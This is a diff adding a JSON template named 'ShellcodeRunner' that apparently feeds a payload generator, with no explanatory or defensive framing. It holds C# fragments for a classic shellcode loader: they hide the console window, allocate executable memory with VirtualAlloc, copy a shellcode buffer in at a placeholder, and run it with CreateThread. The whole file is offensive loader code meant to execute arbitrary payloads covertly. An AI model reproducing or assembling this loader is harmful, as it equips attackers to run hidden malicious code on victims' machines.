@@ -1,0 +1,46 @@
+{
+  "ShellcodeRunner": {
+    "directives": [
+      "using System;",
+      "using System.Runtime.InteropServices;"
+    ],
+    "function_declarations": [
+      "[DllImport(\"kernel32.dll\", SetLastError = true, ExactSpelling = true)] static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);",
+      "[DllImport(\"kernel32.dll\", SetLastError = true)] static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);",
+      "[DllImport(\"kernel32.dll\", SetLastError = true)] static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);",
+      "[DllImport(\"kernel32.dll\")] static extern int GetLastError();",
+      "[DllImport(\"user32.dll\")] static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);",
+      "[DllImport(\"kernel32.dll\")] static extern IntPtr GetConsoleWindow();"
+    ],
+    "constant_declarations": [
+      "const int SW_HIDE = 0;"
+    ],
+    "code_blocks": {
+      "main": [
+        "IntPtr hWnd = GetConsoleWindow();",
+        "ShowWindow(hWnd, SW_HIDE);",
+        "PLACEHOLDER_SHELLCODE"
+      ],
+      "memory_allocation": [
+        "IntPtr mem = VirtualAlloc(IntPtr.Zero, (uint)buf.Length, 0x1000 | 0x2000, 0x40);",
+        "if (mem == IntPtr.Zero)",
+        "{",
+        "    return;",
+        "}"
+      ],
+      "copy_shellcode": [
+        "Marshal.Copy(buf, 0, mem, buf.Length);"
+      ],
+      "execute_shellcode": [
+        "IntPtr hThread = CreateThread(IntPtr.Zero, 0, mem, IntPtr.Zero, 0, IntPtr.Zero);",
+        "if (hThread == IntPtr.Zero)",
+        "{",
+        "    return;",
+        "}"
+      ],
+      "wait_execution": [
+        "WaitForSingleObject(hThread, 0xFFFFFFFF);"
+      ]
+    }
+  }
+}
